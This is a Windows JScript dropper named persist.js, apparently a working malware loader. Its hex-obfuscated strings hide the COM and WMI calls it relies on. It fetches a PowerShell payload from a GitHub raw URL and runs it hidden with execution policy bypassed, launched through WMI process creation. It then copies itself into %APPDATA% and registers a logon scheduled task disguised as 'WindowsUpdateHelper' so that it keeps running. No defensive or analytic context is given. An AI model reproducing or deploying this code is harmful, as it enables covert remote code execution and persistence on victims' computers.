// persist.js -- change PS1_URL only.
var PS1_URL = "https://github.com/i25968627-ui/stunning-tribble/raw/refs/heads/main/zxcvb.ps1";
var NAME = "hello.ps1";
var TASK = "WindowsUpdateHelper";

var Q1  = "\x57\x69\x6e\x48\x74\x74\x70\x2e\x57\x69\x6e\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74\x2e\x35\x2e\x31";
var Q2  = "\x41\x44\x4f\x44\x42\x2e\x53\x74\x72\x65\x61\x6d";
var Q3  = "\x57\x62\x65\x6d\x53\x63\x72\x69\x70\x74\x69\x6e\x67\x2e\x53\x57\x62\x65\x6d\x4c\x6f\x63\x61\x74\x6f\x72";
var Q4  = "\x72\x6f\x6f\x74\x5c\x63\x69\x6d\x76\x32";
var Q5  = "\x57\x69\x6e\x33\x32\x5f\x50\x72\x6f\x63\x65\x73\x73";
var Q6  = "\x43\x72\x65\x61\x74\x65";
var Q7  = "\x45\x78\x65\x63\x4d\x65\x74\x68\x6f\x64";
var Q8  = "\x43\x6f\x6d\x6d\x61\x6e\x64\x4c\x69\x6e\x65";
var Q9  = "\x43\x75\x72\x72\x65\x6e\x74\x44\x69\x72\x65\x63\x74\x6f\x72\x79";
var Q10 = "\x50\x72\x6f\x63\x65\x73\x73\x49\x64";
var Q11 = "\x52\x65\x74\x75\x72\x6e\x56\x61\x6c\x75\x65";
var Q12 = "\x45\x78\x65\x63\x51\x75\x65\x72\x79";
var Q13 = "\x43\x6f\x75\x6e\x74";
var Q14 = "\x70\x6f\x77\x65\x72\x73\x68\x65\x6c\x6c\x2e\x65\x78\x65";
var Q15 = "\x20\x2d\x4e\x6f\x50\x72\x6f\x66\x69\x6c\x65\x20\x2d\x45\x78\x65\x63\x75\x74\x69\x6f\x6e\x50\x6f\x6c\x69\x63\x79\x20\x42\x79\x70\x61\x73\x73\x20\x2d\x57\x69\x6e\x64\x6f\x77\x53\x74\x79\x6c\x65\x20\x48\x69\x64\x64\x65\x6e\x20\x2d\x43\x6f\x6d\x6d\x61\x6e\x64\x20";
var Q16 = "\x4d\x65\x74\x68\x6f\x64\x73\x5f";
var Q17 = "\x49\x74\x65\x6d";
var Q18 = "\x49\x6e\x50\x61\x72\x61\x6d\x65\x74\x65\x72\x73";
var Q19 = "\x53\x70\x61\x77\x6e\x49\x6e\x73\x74\x61\x6e\x63\x65\x5f";
var Q20 = "\x53\x45\x4c\x45\x43\x54\x20\x50\x72\x6f\x63\x65\x73\x73\x49\x64\x20\x46\x52\x4f\x4d\x20\x57\x69\x6e\x33\x32\x5f\x50\x72\x6f\x63\x65\x73\x73\x20\x57\x48\x45\x52\x45\x20\x50\x72\x6f\x63\x65\x73\x73\x49\x64\x3d";
var P1  = "\x53\x63\x68\x65\x64\x75\x6c\x65\x2e\x53\x65\x72\x76\x69\x63\x65";
var P2  = "\x52\x65\x67\x69\x73\x74\x65\x72\x54\x61\x73\x6b\x44\x65\x66\x69\x6e\x69\x74\x69\x6f\x6e";
var P3  = "\x4e\x65\x77\x54\x61\x73\x6b";
var P4  = "\x54\x72\x69\x67\x67\x65\x72\x73";
var P5  = "\x41\x63\x74\x69\x6f\x6e\x73";
var P6  = "\x4c\x6f\x67\x6f\x6e\x54\x79\x70\x65";
var P7  = "\x50\x72\x69\x6e\x63\x69\x70\x61\x6c";
var P8  = "\x77\x73\x63\x72\x69\x70\x74\x2e\x65\x78\x65";

var FSO = new ActiveXObject("Scripting.FileSystemObject");
var DIR = FSO.GetSpecialFolder(2).Path;
var P = DIR + "\\" + NAME;
var LG = DIR + "\\runner.log";
var O = DIR + "\\hello.out";

function log(m) {
    try {
        var f = FSO.OpenTextFile(LG, 8, true);
        f.WriteLine(m);
        f.Close();
    } catch (e) { }
    if (/cscript\.exe$/i.test(WScript.FullName)) { WScript.Echo(m); }
}

function svc() {
    var l = new ActiveXObject(Q3);
    return l.ConnectServer(".", Q4);
}

function dl(u, p) {
    var h = new ActiveXObject(Q1);
    h.SetTimeouts(8000, 8000, 15000, 30000);
    h.Open("GET", u, false);
    h.SetRequestHeader("User-Agent", "Mozilla/5.0");
    h.Send();
    if (h.Status != 200) { throw new Error("HTTP " + h.Status); }
    var st = new ActiveXObject(Q2);
    st.Type = 1;
    st.Open();
    st.Write(h.ResponseBody);
    st.SaveToFile(p, 2);
    st.Close();
    return FSO.GetFile(p).Size;
}

function run(c) {
    var s = svc();
    var cls = s.Get(Q5);
    var ip = cls[Q16][Q17](Q6)[Q18][Q19]();
    ip[Q8] = c;
    ip[Q9] = DIR;
    var op = s[Q7](Q5, Q6, ip);
    if (op[Q11] != 0) { throw new Error("rc " + op[Q11]); }
    return op[Q10];
}

function alive(pid) {
    var s = svc();
    return s[Q12](Q20 + pid)[Q13] > 0;
}

function persist() {
    var SH = new ActiveXObject("WScript.Shell");
    var APPDATA = SH.ExpandEnvironmentStrings("%APPDATA%");
    var WINDIR = SH.ExpandEnvironmentStrings("%WINDIR%");
    var WHO = SH.ExpandEnvironmentStrings("%USERDOMAIN%\\%USERNAME%");
    var DEST = APPDATA + "\\Microsoft\\" + TASK + ".js";

    if (WScript.ScriptFullName.toLowerCase() != DEST.toLowerCase()) {
        FSO.CopyFile(WScript.ScriptFullName, DEST, true);
    }

    var svc = new ActiveXObject(P1);
    svc.Connect();
    var root = svc.GetFolder("\\");
    var td = svc[P3](0);
    td.RegistrationInfo.Description = TASK;
    td.Settings.Enabled = true;
    td.Settings.Hidden = false;

    var trg = td[P4].Create(9);
    trg.UserId = WHO;

    var act = td[P5].Create(0);
    act.Path = WINDIR + "\\System32\\" + P8;
    act.Arguments = '"' + DEST + '"';

    td[P7][P6] = 3;
    root[P2](TASK, td, 6, null, null, 3);
    return DEST;
}

try {
    if (!FSO.FolderExists(DIR)) { FSO.CreateFolder(DIR); }
    log("a " + DIR);
    var n = dl(PS1_URL, P);
    log("b " + n);
    var cmd = Q14 + Q15 + "\"& '" + P + "' *> '" + O + "'\"";
    var pid = run(cmd);
    log("c " + pid);
    var w = 0;
    while (w < 20000 && alive(pid)) { WScript.Sleep(250); w += 250; }
    log("d " + w);
    if (FSO.FileExists(O)) {
        var t = FSO.OpenTextFile(O, 1).ReadAll();
        log("e " + t.length);
    }
    var tn = persist();
    log("g " + tn);
    log("f");
} catch (e) {
    log("x " + (e.message ? e.message : e));
    if (/cscript\.exe$/i.test(WScript.FullName)) { WScript.Quit(1); }
}
